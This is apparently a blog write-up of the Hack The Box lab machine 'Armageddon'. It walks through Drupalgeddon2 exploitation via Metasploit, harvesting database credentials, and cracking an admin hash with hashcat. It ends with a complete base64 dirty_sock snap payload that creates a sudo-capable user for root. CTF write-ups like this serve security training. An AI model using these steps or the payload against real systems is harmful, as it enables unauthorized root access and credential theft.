---
title: Armageddon
date: 2021-05-01 11:37:00 +0200
categories: [machine]
tags: [hackthebox]
toc: false
---

# Enumeration
## NMAP Scan
This machines has only two open ports (22 and 80), we see that Apache 2.4.6 is serving Drupal 7 and PHP 5.4.16 - both are outdated and most likely vulnerable.
``` bash
┌─[x7f@pWnbox]─[/ctf/hackthebox/machines/armageddon]
└──╼ $sudo nmap -A -sC -sV 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php
```
## Website
Upon visiting the website on port 80 are presented with this Login page. We can neither log in nor register an account.
![](/assets/img/armageddon_box.png#center)
## Vulnerability
A quick look at searchsploit gives us a lot of stuff to try out.
``` bash
┌─[x7f@pWnbox]─[/ctf/hackthebox/machines/armageddon]
└──╼ $searchsploit drupal
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                        | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                         | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                              | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                              | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                 | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                   | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                       | php/webapps/41564.php
Drupal < 7.34 - Denial of Service                                                                                        | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                 | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                              | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                      | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                         | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                    | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                           | php/webapps/46452.txt
```
# Exploitation
After trying out some stuff the only think working for me was this _metasploit_ module `exploit/unix/webapp/drupal_drupalgeddon2 - Drupal Drupalgeddon 2 Forms API Property Injection`.

We need to set _RHOSTS_ to the armageddon machines IP (10.10.10.233) and change the _LHOST_ to our IP. After running the exploit, we get a shell with the user `apache`.
# Lateral movement
If we look at the files with `ls -alt`, we see a `.gitignore` that contains:
``` bash
cat .gitignore
# Ignore configuration files that may contain sensitive information.
sites/*/settings*.php

# Ignore paths that contain user-generated content.
sites/*/files
sites/*/private
```
After reviewing most of the  _settings*.php_ files, we find credentials for `mysql` in `/var/www/html/sites/default/settings.php`

``` php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
Connect with `mysql -u drupaluser -D drupal -p` to the database. There are quite a few tables, but the most interesting one is the `user` table.

So lets check the contents of that table with `SELECT * FROM users; exit;`, because of the broken metasploit shell I have to append _exit;_ to every query or I won't get any output. 
``` mysql
select * from users; exit;
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	16069987561607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
3	test123	$S$DdP70hh72ujJ8snhVJGwTq6Mc2/K5piY6l8OhfeJlJCUq0c6adTm	test123@htb.com			filtered_html	1619855480	0	0	0	Europe/London		0	test123@htb.com	NULL
```
Identify the hash type and start cracking
``` bash
┌─[x7f@pWnbox]─[/ctf/hackthebox/machines/armageddon]
└──╼ $hashid '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' -m
Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
[+] Drupal > v7.x [Hashcat Mode: 7900]
```

``` bash
┌─[x7f@pWnbox]─[/ctf/hackthebox/machines/armageddon]
└──╼ $hashcat -m 7900 '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' /usr/share/SecLists/rockyou.txt --show
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```
We can login vai ssh `brucetherealadmin:booboo` and read the `user.txt` flag. ٩(◕‿◕｡)۶
# Root
With `sudo -l` we can check what we can run with root privilege.
``` bash
[brucetherealadmin@armageddon ~]$ sudo -l
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
Googling for "privilege escalation snap" we quickly find lots of ressources and a [PoC](https://github.com/initstring/dirty_sock). The script doesn't work but we only need the payload for the file. So let's do it manually.
``` bash
python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > root.snap
```
Install it:
``` bash
sudo snap install root.snap --devmode --dangerous
```
Change the user to `dirty_sock`
``` bash
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: dirty_sock
```
and finally switch to `root`.
``` bash
[dirty_sock@armageddon tmp]$ sudo -i

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: dirty_sock
```
we grab the `root.txt` flag and we are done here. ٩(◕‿◕｡)۶
